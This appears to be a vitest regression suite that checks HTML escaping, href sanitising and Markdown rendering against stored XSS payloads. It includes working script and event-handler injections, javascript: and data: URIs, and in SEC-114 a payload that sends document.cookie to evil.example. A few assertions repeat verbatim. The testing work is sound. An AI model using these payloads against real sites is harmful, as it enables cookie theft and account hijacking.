/**
 * SEC-1xx — stored XSS / output-encoding regression suite.
 *
 * Every field named in these cases is one the schema stores as free text and the product
 * renders back to a browser. The payloads are the ones that actually work in 2026, not
 * museum pieces: `<img onerror>`, `javascript:` in a Markdown link, `srcdoc`, and
 * attribute-breakout through an unquoted value.
 */
import { describe, it, expect } from 'vitest';
import { escapeHtml, safeAttribute, safeHref, renderInlineMarkdown } from '../helpers/html.js';

const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '"><svg onload=alert(1)>',
  "'><iframe srcdoc='<script>alert(1)</script>'>",
  '<a href="javascript:alert(1)">click</a>',
  '<style>@import "https://evil.example/x.css";</style>',
  '<details open ontoggle=alert(1)>',
];

describe('stored XSS: text escaping', () => {
  it('SEC-101 escapes every payload so no tag survives (workflows.name)', () => {
    for (const payload of XSS_PAYLOADS) {
      const out = escapeHtml(payload);
      expect(out, payload).not.toMatch(/<[a-zA-Z/]/);
      expect(out, payload).not.toContain('"');
      expect(out, payload).not.toContain("'");
    }
  });

  it('SEC-102 escapes the five significant characters plus backtick and equals', () => {
    expect(escapeHtml(`&<>"'\`=`)).toBe('&amp;&lt;&gt;&quot;&#39;&#96;&#61;');
  });

  it('SEC-103 escapes ampersand first so double-encoding is not a bypass', () => {
    // If `<` were replaced before `&`, `&lt;script&gt;` would decode back to a tag.
    expect(escapeHtml('&lt;script&gt;')).toBe('&amp;lt;script&amp;gt;');
  });

  it('SEC-104 strips control characters from attribute values (support_cases.subject)', () => {
    const payload = 'ok\u000a\u000d onmouseover=alert(1)';
    const out = safeAttribute(payload);
    expect(out).not.toContain('\u000a');
    expect(out).not.toContain('\u000d');
    expect(out).not.toContain('\u000a');
    expect(out).not.toContain('\u000d');
    expect(out).toContain('&#61;'); // the `=` cannot start a new attribute
  });

  it('SEC-105 rejects javascript: and data: in any href position (CRM value in a report)', () => {
    for (const bad of [
      'javascript:alert(1)',
      'JaVaScRiPt:alert(1)',
      'javascript:alert(1)',
      'java\tscript:alert(1)',
      ' javascript:alert(1)',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'vbscript:msgbox(1)',
    ]) {
      expect(safeHref(bad), bad).toBeNull();
    }
  });

  it('SEC-106 allows ordinary http, https, mailto and site-relative links', () => {
    expect(safeHref('https://hubspot.com/x')).toContain('https://hubspot.com/x');
    expect(safeHref('mailto:owner@example.com')).toContain('mailto:');
    expect(safeHref('/app/runs/run_123')).toBe('/app/runs/run_123');
    // A protocol-relative value resolves to a FOREIGN origin. safeHref is an XSS
    // control, not an open-redirect control: it returns the absolute URL so the origin
    // is visible to the reader. Choosing redirect targets is a separate control (see
    // threat REDIR-01 in docs/threat-model.md) and must use an allowlist of paths.
    expect(safeHref('//evil.example/x')).toBe('https://evil.example/x');
  });

  it('SEC-107 never emits a raw quote into an href (attribute breakout)', () => {
    const out = safeHref('https://example.test/?q="onmouseover="alert(1)');
    expect(out).not.toBeNull();
    expect(out ?? '').not.toContain('"');
  });
});

describe('stored XSS: Markdown rendering (support replies, owner notes)', () => {
  it('SEC-110 escapes raw HTML inside Markdown rather than passing it through', () => {
    const out = renderInlineMarkdown('hello <img src=x onerror=alert(1)> world');
    expect(out).not.toContain('<img');
    expect(out).toContain('&lt;img');
  });

  it('SEC-111 refuses to build a link for a javascript: target', () => {
    const out = renderInlineMarkdown('[click](javascript:alert(1))');
    expect(out).not.toContain('<a ');
    expect(out).not.toContain('href=');
  });

  it('SEC-112 renders an allowed link with rel="nofollow noopener noreferrer"', () => {
    const out = renderInlineMarkdown('see [docs](https://example.test/a)');
    expect(out).toContain('<a href="https://example.test/a"');
    expect(out).toContain('rel="nofollow noopener noreferrer"');
  });

  it('SEC-113 supports bold, italic and code without allowing nested tags', () => {
    expect(renderInlineMarkdown('**bold**')).toBe('<strong>bold</strong>');
    expect(renderInlineMarkdown('a *it* b')).toBe('a <em>it</em> b');
    expect(renderInlineMarkdown('`<b>`')).toBe('<code>&lt;b&gt;</code>');
  });

  it('SEC-114 does not let a UTM parameter smuggle markup into an analytics view', () => {
    // visit_sessions.utm_source is written from a query string on a public page.
    const utm = '"><script>fetch("https://evil.example?c="+document.cookie)</script>';
    const out = escapeHtml(utm);
    expect(out).not.toContain('<script');
    expect(out).not.toContain('"');
  });
});
